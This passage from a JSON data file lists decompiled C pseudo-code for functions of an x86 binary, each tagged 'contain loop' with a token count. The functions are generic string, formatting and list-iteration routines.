        "decompiled_code": "\nchar * __fastcall fcn.00409728(uint param_1, char param_2)\n\n{\n    char *in_EAX;\n    \n    while( true ) {\n        if (param_2 == *in_EAX) {\n            return in_EAX;\n        }\n        if (*in_EAX == '\\0') break;\n        in_EAX = in_EAX + 1;\n    }\n    return NULL;\n}\n",
        "token_count": 88
    },
    "0040973c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * __fastcall fcn.0040973c(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    bool bVar9;\n    \n    if ((in_EAX != NULL) && (param_2 != NULL)) {\n        uVar2 = 0xffffffff;\n        pcVar7 = param_2;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar2 - 1;\n        if (uVar3 != 0) {\n            uVar4 = 0xffffffff;\n            pcVar7 = in_EAX;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                cVar1 = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n            } while (cVar1 != '\\0');\n            iVar5 = ~uVar4 - uVar3;\n            bVar9 = iVar5 == 0;\n            if (uVar3 <= ~uVar4 && !bVar9) {\n                do {\n                    pcVar7 = param_2 + 1;\n                    pcVar8 = in_EAX;\n                    do {\n                        in_EAX = pcVar8;\n                        if (iVar5 == 0) break;\n                        iVar5 = iVar5 + -1;\n                        in_EAX = pcVar8 + 1;\n                        bVar9 = *param_2 == *pcVar8;\n                        pcVar8 = in_EAX;\n                    } while (!bVar9);\n                    iVar6 = ~uVar2 - 2;\n                    pcVar8 = in_EAX;\n                    if (!bVar9) {\n                        return NULL;\n                    }\n                    do {\n                        if (iVar6 == 0) break;\n                        bVar9 = *pcVar7 == *pcVar8;\n                        iVar6 = iVar6 + -1;\n                        pcVar8 = pcVar8 + 1;\n                        pcVar7 = pcVar7 + 1;\n                    } while (bVar9);\n                    if (bVar9) {\n                        return in_EAX + -1;\n                    }\n                } while( true );\n            }\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 579
    },
    "004099b2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004099b2(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *puVar3;\n    char cVar4;\n    int16_t iVar6;\n    uint32_t uVar7;\n    uint extraout_ECX;\n    unkbyte3 Var8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t unaff_EBP;\n    uint8_t *puVar11;\n    float10 fVar12;\n    float10 fVar13;\n    float10 fVar14;\n    uint var_69h;\n    uint var_59h;\n    uint var_49h;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint var_ch;\n    uint var_4h;\n    char cVar5;\n    \n    iVar9 = *(unaff_EBP + -0xc);\n    if (iVar9 <= *(unaff_EBP + 8)) {\n        *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n    // WARNING: Could not recover jumptable at 0x004099d2. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x4099d9\n        (**(*(*(unaff_EBP + 0xc) + iVar9 * 8 + 4) * 4 + 0x4099d9))();\n        return;\n    }\n    do {\n        fcn.00409bdf();\n        puVar3 = fcn.00409800();\n        uVar10 = *(unaff_EBP + -0x24);\n        if (0x20 < uVar10) {\n            uVar10 = 0;\n        }\n        cVar5 = extraout_ECX;\n        Var8 = extraout_ECX >> 8;\n        cVar4 = cVar5 + -0x44;\n        if (cVar4 == '\\0') break;\n        cVar4 = '\\x10';\n        Var8 = 0;\n        if (cVar5 == 'X') break;\n        cVar4 = '\\n';\n        Var8 = 0;\n    } while (cVar5 != 'U');\n    iVar6 = CONCAT31(Var8, cVar4);\n    if ((cVar4 == '\\0') && (iVar6 = 10,  (*(puVar3 + 4) & 0x80000000) != 0)) {\n        fcn.00408ddc(-*puVar3, -(*(puVar3 + 4) + (*puVar3 != 0)));\n        *(unaff_EBP + -0x4a) = 0x2d;\n        return;\n    }\n    if ((*(puVar3 + 4) & 0x80000000) == 0) {\n        fVar14 = *puVar3;\n    }\n    else {\n        fVar14 = 0x7fffffffffffffff + 1 + (*puVar3 & 0x7fffffffffffffff);\n    }\n    fVar12 = iVar6;\n    puVar11 = unaff_EBP + -0x49;\n    do {\n        puVar11 = puVar11 + -1;\n        fVar13 = fVar14 - (fVar14 / fVar12) * fVar12;\n        fVar14 = fVar14 / fVar12;\n        var_4h._0_1_ = ROUND(fVar13);\n        uVar2 = var_4h + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = var_4h + 0x37;\n        }\n        *puVar11 = uVar2;\n    } while (1 <= fVar14);\n    uVar7 = (unaff_EBP + -0x49) - puVar11;\n    iVar9 = uVar10 - uVar7;\n    if (uVar7 <= uVar10 && iVar9 != 0) {\n        iVar1 = -iVar9;\n        while (iVar9 = iVar9 + -1,  iVar9 != 0) {\n            (puVar11 + iVar1)[iVar9] = 0x30;\n        }\n        puVar11[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 985
    },
    "0040a36b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040a36b(void)\n\n{\n    char cVar1;\n    char *unaff_ESI;\n    \n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 == '\\0') {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n    } while (cVar1 == ' ');\n    return;\n}\n",
        "token_count": 86
    },
    "0040b470": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040b470(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *param_2;\n    while( true ) {\n        iVar1 = fcn.00405060();\n        if ((iVar1 < iVar2) || (*(in_EAX + -1 + iVar2) != ' ')) break;\n        iVar2 = iVar2 + 1;\n    }\n    *param_2 = iVar2;\n    return;\n}\n",
        "token_count": 126
    },
    "0040b63c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040b63c(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 1;\n    while( true ) {\n        iVar2 = fcn.00405060();\n        if (iVar2 < iVar3) {\n            return 0;\n        }\n        uVar1 = *(in_EAX + -1 + iVar3) & 0xdf;\n        if (uVar1 == 0x44) {\n            return 1;\n        }\n        if (uVar1 == 0x45) {\n            return 2;\n        }\n        if (uVar1 == 0x4d) break;\n        if (uVar1 == 0x59) {\n            return 2;\n        }\n        iVar3 = iVar3 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 199
    },
    "0040d448": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d448(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = fcn.0040d47c();\n    iVar3 = iVar2;\n    if (param_2 != '\\0') {\n        while (iVar1 = iVar3,  iVar1 != 0) {\n            iVar3 = fcn.0040d47c();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 124
    },
    "0040d47c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040d47c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = fcn.00409728();\n    while ((iVar2 != 0 && (cVar1 = fcn.0040cf78(),  cVar1 != '\\0'))) {\n        iVar2 = fcn.00409728();\n    }\n    return iVar2;\n}\n",
        "token_count": 90
    },
    "0040dc3c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar fcn.0040dc3c(void)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    cVar1 = '\\x01';\n    for (puVar2 = *0x490a18; (cVar1 != '\\0' && (puVar2 != NULL)); puVar2 = *puVar2) {\n        cVar1 = (*puVar2[1])();\n    }\n    return cVar1;\n}\n",
        "token_count": 98
    },
    "0040f6bc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040f6bc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x40f901;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040f6bc::var_18h;\n    if (in_EAX < -0x7ffdfff5) {\n        if (in_EAX == -0x7ffdfff6) {\n            var_1ch = 0x40f792;\n            var_10h = &stack0xfffffffc;\n            fcn.00406a50();\n            var_1ch = 0x40f7a1;\n            fcn.0040c5ac();\n            var_1ch = 0x40f7a6;\n            fcn.004047cc();\n            goto code_r0x0040f8d9;\n        }\n        if (in_EAX < -0x7ffdfffa) {\n            if (in_EAX == -0x7ffdfffb) {\n                var_1ch = 0x40f750;\n                var_10h = &stack0xfffffffc;\n                fcn.0040f488();\n                goto code_r0x0040f8d9;\n            }\n            if (in_EAX == -0x7fffbfff) {\n                var_1ch = 0x40f804;\n                var_10h = &stack0xfffffffc;\n                fcn.00406a50();\n                var_1ch = 0x40f813;\n                fcn.0040c5ac();\n                var_1ch = 0x40f818;\n                fcn.004047cc();\n                goto code_r0x0040f8d9;\n            }\n            if (in_EAX == -0x7fff0001) {\n                var_1ch = 0x40f873;\n                var_10h = &stack0xfffffffc;\n                fcn.00406a50();\n                var_1ch = 0x40f882;\n                fcn.0040c5ac();\n                var_1ch = 0x40f887;\n                fcn.004047cc();\n                goto code_r0x0040f8d9;\n            }\n        }\n        else {\n            if (in_EAX == -0x7ffdfff8) {\n                var_1ch = 0x40f762;\n                var_10h = &stack0xfffffffc;\n                fcn.00406a50();\n                var_1ch = 0x40f771;\n                fcn.0040c5ac();\n                var_1ch = 0x40f776;\n                fcn.004047cc();\n                goto code_r0x0040f8d9;\n            }\n            if (in_EAX == -0x7ffdfff7) {\n                var_1ch = 0x40f780;\n                var_10h = &stack0xfffffffc;\n                fcn.0040f578();\n                goto code_r0x0040f8d9;\n            }\n        }\n    }\n    else {\n        if (in_EAX == -0x7ffdfff5) {\n            var_1ch = 0x40f7b8;\n            fcn.00406a50();\n            var_1ch = 0x40f7c7;\n            fcn.0040c5ac();\n            var_1ch = 0x40f7cc;\n            fcn.004047cc();\n            goto code_r0x0040f8d9;\n        }\n        if (in_EAX == -0x7ffdfff3) {\n            var_1ch = 0x40f7de;\n            var_10h = &stack0xfffffffc;\n            fcn.00406a50();\n            var_1ch = 0x40f7ed;\n            fcn.0040c5ac();\n            var_1ch = 0x40f7f2;\n            fcn.004047cc();\n            goto code_r0x0040f8d9;\n        }\n        if (in_EAX == -0x7ff8fff2) {\n            var_1ch = 0x40f82a;\n            var_10h = &stack0xfffffffc;\n            fcn.00406a50();\n            var_1ch = 0x40f839;\n            fcn.0040c5ac();\n            var_1ch = 0x40f83e;\n            fcn.004047cc();\n            goto code_r0x0040f8d9;\n        }\n        if (in_EAX == -0x7ff8ffa9) {\n            var_1ch = 0x40f850;\n            var_10h = &stack0xfffffffc;\n            fcn.00406a50();\n            var_1ch = 0x40f85f;\n            fcn.0040c5ac();\n            var_1ch = 0x40f864;\n            fcn.004047cc();\n            goto code_r0x0040f8d9;\n        }\n    }\n    var_38h = **0x492c88;\n    var_34h._0_1_ = 0xb;\n    var_2ch._0_1_ = 0;\n    var_1ch = 0x40f8a8;\n    var_10h = &stack0xfffffffc;\n    fcn.0040bd98();\n    var_1ch = &fcn.0040f6bc::var_38h;\n    var_20h = 2;\n    var_24h = 0x40f8c5;\n    fcn.00406a50();\n    var_24h = 0x40f8d4;\n    fcn.0040c5e8(var_20h, var_1ch);\n    var_24h = 0x40f8d9;\n    fcn.004047cc();\ncode_r0x0040f8d9:\n    *in_FS_OFFSET = var_20h;\n    var_18h = 0x40f908;\n    var_1ch = 0x40f8f3;\n    fcn.00404dc4();\n    var_1ch = 0x40f900;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 1627
    },
    "00411978": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00411978(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    \n    if (param_2 != 0) {\n        iVar2 = **(in_EAX + 0xb + *(in_EAX + 1));\n        uVar3 = *(iVar2 + 1);\n        puVar4 = iVar2 + 0xf + uVar3;\n        piVar1 = iVar2 + 7 + uVar3;\n        iVar2 = 0;\n        do {\n            uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            if (uVar3 == *(param_2 + -4)) {\n                while (((*((uVar3 - 1) + param_2) ^ puVar4[uVar3]) & 0xdf) == 0) {\n                    uVar3 = uVar3 - 1;\n                    if (uVar3 == 0) {\n                        return iVar2;\n                    }\n                }\n                uVar3 = uVar3 & 0xffffff00 | *puVar4;\n            }\n            iVar2 = iVar2 + 1;\n            puVar4 = puVar4 + uVar3 + 1;\n        } while (iVar2 <= *piVar1);\n    }\n    return -1;\n}\n",
        "token_count": 321
    },
    "00411a28": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411a28(uint param_1, uchar *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t uVar4;\n    uchar *puVar3;\n    uchar *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    if (in_EAX != 0) {\n        puVar3 = param_2;\n        if (param_2 != NULL) {\n            puVar3 = CONCAT11(*param_2, param_2[-4]) & 0xdfff;\n        }\n        while( true ) {\n            iVar1 = in_EAX + 2 + *(in_EAX + 1);\n            uVar6 = *(iVar1 + 10);\n            uVar7 = *(iVar1 + 0xb + uVar6);\n            if (uVar7 != 0) {\n                iVar2 = iVar1 + 0xd + uVar6;\n                do {\n                    puVar5 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffffdfff;\n                    if (puVar5 == puVar3) {\n                        uVar6 = uVar6 & 0xffff0000 | *(iVar2 + 0x1a) & 0xffff00ff;\n                        while( true ) {\n                            uVar4 = param_2[uVar6 - 1] ^ *(iVar2 + 0x1a + uVar6);\n                            if ((uVar4 & 0xdf) != 0) break;\n                            uVar6 = uVar6 - 1;\n                            puVar3 = puVar3 & 0xffff0000 | CONCAT11(uVar4, puVar3);\n                            if (uVar6 == 0) {\n                                return;\n                            }\n                        }\n                        puVar3 = puVar3 & 0xffff0000 | CONCAT11(*param_2, puVar3) & 0xffffdfff;\n                        puVar5 = uVar6 & 0xffffff00 | *(iVar2 + 0x1a);\n                    }\n                    uVar6 = puVar5 & 0xffff00ff;\n                    uVar7 = uVar7 - 1;\n                    iVar2 = iVar2 + 0x1b + uVar6;\n                } while (uVar7 != 0);\n            }\n            if (*(iVar1 + 4) == NULL) break;\n            in_EAX = **(iVar1 + 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 558
    },
    "00413d20": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00413d20(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if ((*(in_EAX + 4) != 0) && (iVar3 = *(*(in_EAX + 4) + 8),  -1 < iVar3 + -1)) {\n        do {\n            uVar2 = fcn.00414eec();\n            cVar1 = fcn.00403e4c();\n            if (cVar1 != '\\0') goto code_r0x00413d7f;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    if ((*(in_EAX + 8) == NULL) || (iVar3 = (**(**(in_EAX + 8) + 0x54))(),  iVar3 < 0)) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = (**(**(in_EAX + 8) + 0x18))();\n    }\ncode_r0x00413d7f:\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 270
    },
    "00413d88": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __fastcall fcn.00413d88(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    iVar2 = *(*(in_EAX + 0xc) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00414eec();\n            cVar1 = fcn.00404184();\n            if (cVar1 != '\\0') goto code_r0x00413dc2;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x00413dc2:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 234
    },
    "00413f7c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00413f7c(uint param_1, int32_t param_2)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x20) != param_2) {\n        *(in_EAX + 0x20) = param_2;\n        iVar3 = *(*(in_EAX + 4) + 8);\n        if (-1 < iVar3 + -1) {\n            do {\n                iVar2 = fcn.00414eec();\n                uVar1 = fcn.00413d88();\n                *(iVar2 + 0x10) = uVar1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "0041409c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0041409c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    iVar1 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00414eec();\n            uVar2 = fcn.00413c14(param_2);\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return CONCAT44(param_2, uVar2);\n}\n",
        "token_count": 143
    },
    "004142a4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __fastcall fcn.004142a4(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uStack20;\n    \n    uStack20._1_3_ = param_1 >> 8;\n    uStack20 = CONCAT31(uStack20._1_3_, 1);\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00414eec();\n            cVar1 = fcn.00413e8c();\n            if (cVar1 != '\\0') goto code_r0x004142dc;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uStack20 = uStack20._1_3_ << 8;\ncode_r0x004142dc:\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 233
    },
    "004142e8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004142e8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00414eec();\n            iVar1 = fcn.00414f48();\n            if (-1 < iVar1) {\n                return;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00413c84();\n    fcn.00414d8c();\n    return;\n}\n",
        "token_count": 146
    },
    "00414664": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00414664(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    \n    puStack12 = 0x414674;\n    fcn.00414280();\n    uStack16 = 0x4146c9;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    puStack12 = &stack0xfffffffc;\n    while( true ) {\n        cVar1 = fcn.004142a4();\n        if (cVar1 != '\\0') break;\n        fcn.0041428c();\n        if (in_EAX == *0x412ac4) break;\n        in_EAX = fcn.00403ee4();\n    }\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x4146d0;\n    uStack16 = 0x4146c8;\n    fcn.00414338();\n    return;\n}\n",
        "token_count": 236
    },
    "00414b70": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00414b70(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.00406b88();\n    iVar1 = *(*(iVar1 + 8) + 8);\n    if (-1 < iVar1 + -1) {\n        do {\n            piVar2 = fcn.00414eec();\n            (**(*piVar2 + 0xc))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "00414f48": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00414f48(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    for (iVar1 = 0; (iVar1 < *(in_EAX + 8) && (param_2 != *(*(in_EAX + 4) + iVar1 * 4))); iVar1 = iVar1 + 1) {\n    }\n    if (iVar1 == *(in_EAX + 8)) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "00415760": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415760(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    fcn.00406570();\n    if (in_EAX != NULL) {\n        iVar2 = fcn.00404154();\n        if (iVar2 == 0) {\n            cVar1 = fcn.004040e4();\n            if ((cVar1 != '\\0') && ((*(in_EAX + 7) & 0x10) != 0)) {\n                fcn.00406570();\n                (**(*in_EAX + 0x28))();\n            }\n        }\n        else {\n            cVar1 = fcn.004040e4();\n            if ((cVar1 == '\\0') || ((*(in_EAX + 7) & 0x10) != 0)) {\n                fcn.00406570();\n                fcn.00415760();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "00415b00": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00415b00(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x415b19;\n    cVar1 = fcn.004040e4();\n    if (cVar1 == '\\0') {\n        puStack24 = 0x415b8f;\n        fcn.00415504();\n        return;\n    }\n    puStack24 = 0x415b25;\n    (**(*in_EAX + 0x20))();\n    uStack28 = 0x415b7e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00415bac();\n    iVar2 = fcn.00415c50();\n    if (-1 < iVar2 + -1) {\n        do {\n            uVar3 = fcn.00415c58();\n            piVar4 = fcn.00415ae0(uVar3);\n            (**(*piVar4 + 8))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x415b8f;\n    uStack28 = 0x415b7d;\n    (**(*in_EAX + 0x24))();\n    return;\n}\n",
        "token_count": 367
    },
    "00418b40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00418b40(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar1 = *(*(in_EAX + 0x30) + 8);\n        if (-1 < iVar1 + -1) {\n            do {\n                fcn.00414eec();\n                fcn.00403f58();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.00403f58();\n        *(in_EAX + 0x30) = 0;\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "00418e78": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418e78(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00405c9c();\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00414d8c();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "0041b7c0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041b7c0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x1c) & 8) == 0) {\n        *(in_EAX + 0x1c) = *(in_EAX + 0x1c) | 8;\n        if ((*(in_EAX + 0x10) != 0) && (iVar1 = *(*(in_EAX + 0x10) + 8),  -1 < iVar1 + -1)) {\n            do {\n                fcn.00414eec();\n                fcn.0041b7c0();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 179
    },
    "0041bf54": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041bf54(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((arg_8h != in_EAX[0x10]) || (arg_ch != in_EAX[0x11])) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00414eec(arg_8h, arg_ch);\n                (**(*piVar1 + 0x10))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        in_EAX[0x10] = arg_8h;\n        in_EAX[0x11] = arg_ch;\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 215
    },
    "0041c544": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041c544(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = 0x41c554;\n    iVar1 = fcn.004152b4();\n    uStack24 = 0x41c599;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar1 = *(iVar1 + 8);\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar1 + -1) {\n        do {\n            fcn.00414eec();\n            fcn.00403f58();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41c5a0;\n    uStack24 = 0x41c598;\n    fcn.00415318();\n    return;\n}\n",
        "token_count": 229
    },
    "0041cf04": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041cf04(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0x10) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.0041c994();\n            (**(**(iVar1 + 4) + 0x28))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "0043550c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043550c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    while (*(*(in_EAX + 600) + 8) < param_2) {\n        fcn.0043502c();\n    }\n    while (param_2 < *(*(in_EAX + 600) + 8)) {\n        fcn.00414fd4();\n        fcn.00403f58();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "00436d04": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00436d04(void)\n\n{\n    int32_t in_EAX;\n    uchar *puVar1;\n    \n    fcn.00404da0();\n    if (in_EAX != 0) {\n        fcn.004050b0();\n        fcn.00405264();\n        puVar1 = fcn.0040d47c();\n        while (puVar1 != NULL) {\n            *puVar1 = 0;\n            puVar1 = fcn.0040d47c();\n        }\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "0043a818": {
        "rules": [
            "contain loop"
        ],
